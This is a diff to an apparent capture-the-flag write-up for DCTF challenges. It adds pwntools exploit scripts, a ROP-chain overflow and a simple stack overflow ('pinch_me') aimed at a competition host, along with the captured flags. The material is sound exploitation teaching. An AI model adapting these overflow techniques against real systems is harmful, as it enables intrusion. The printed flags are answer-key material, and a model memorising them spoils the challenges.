@@ -14,7 +14,7 @@ pop_rdi = next(binary.search(asm('pop rdi; ret')))
 pop_rsi_r15 = next(binary.search(asm('pop rsi; pop r15; ret')))
 
 payload  = b''
-payload += 0x48 * b'A'
+payload += b'A' * 72
 payload += p64(pop_rdi)
 payload += p64(0xdeadbeef)
 payload += p64(pop_rsi_r15)
@@ -26,3 +26,24 @@ p.sendlineafter('joke\n',payload)
 p.interactive()
 ```
 FLAG: ``dctf{Ju5t_m0v3_0n}``
+
+# ***PINCH_ME***
+
+```py
+from pwn import *
+
+binary = context.binary = ELF('./pinch_me')
+
+if args.REMOTE:
+    p = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)
+else:
+    p = process(binary.path)
+
+payload  = b''
+payload += b'A' * 24
+payload += p64(0x1337c0de)
+
+p.sendlineafter('?\n',payload)
+p.interactive()
+```
+FLAG : ``dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}``
